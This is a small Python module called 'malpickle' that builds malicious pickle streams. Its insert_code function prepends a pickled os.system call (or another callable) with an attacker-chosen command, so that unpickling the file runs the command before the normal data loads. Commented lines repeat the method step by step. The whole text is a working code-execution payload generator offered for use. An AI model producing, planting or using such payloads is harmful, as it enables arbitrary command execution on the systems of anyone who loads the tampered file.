""" malpickle - insert code into pickle files """

import pickle
import os

def insert_code(code, pickle_stream, callable=os.system):
    """ usage: insert_code(code, pickle_stream,
                           callable=os.system) => malpickle stream

        Inserts a call to callable using code as arguments into _pickle_stream.
        When malpickle is unpickled, callable(code) will be performed before the data from pickle_stream is returned.
        code must be a string of code to be supplied to callable
        pickle_stream must be bytes
        callable must be accessible to the process that will do the unpickling.
            - callable should be a built-in or from a built-in module/package"""
    return pickle.dumps(callable)[:-1] + pickle.dumps((code, ))[:-1] + 'R' + pickle_stream
    # it really only takes one line of code to make a malpickle
    #function = pickle.dumps(callable)[:-1]
    #args = pickle.dumps((code, ))[:-1]
    #malpickle = function + args + 'R'
    #return malpickle + _pickle_stream
